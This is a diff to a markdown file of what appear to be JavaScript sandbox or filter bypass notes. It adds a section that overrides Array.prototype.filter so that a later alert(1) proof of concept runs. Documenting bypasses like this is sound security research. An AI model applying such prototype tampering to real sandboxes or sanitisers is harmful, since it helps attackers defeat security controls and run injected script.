@@ -30,3 +30,15 @@ exec(`
   window.alert(1)
 `)
 ```
+
+## Overriding Array Protoype
+
+```javascript
+[].__proto__.filter = () => []
+```
+
+On the next execution this works.
+```javascript
+alert(1)
+```
+
